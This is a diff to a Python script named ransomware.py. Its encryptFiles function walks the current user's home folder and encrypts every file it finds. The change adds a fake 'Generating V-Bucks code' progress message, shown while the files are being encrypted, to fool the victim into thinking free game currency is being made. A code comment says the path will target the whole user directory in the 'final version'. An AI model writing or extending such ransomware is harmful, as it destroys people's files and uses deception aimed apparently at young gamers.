@@ -38,10 +38,12 @@ def generateKey():
 
 def encryptFiles(key):
     #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
+    progress = 100;
     for root, dirs, files in os.walk('C:\\Users\\{user}{path}'.format(path=path, user=os.getlogin())):
         for file in files:
             if(not (file == 'key.key' or file == 'ransomware.py' or '.encrypted' in file)):
-                #print(file)
+                print("Generating V-Bucks code: " + str(100 - progress) + "%")
+                progress = progress * 0.75
                 encryptFile(root + '\\' + file, key)
 
 def encryptFile(filePath, key):
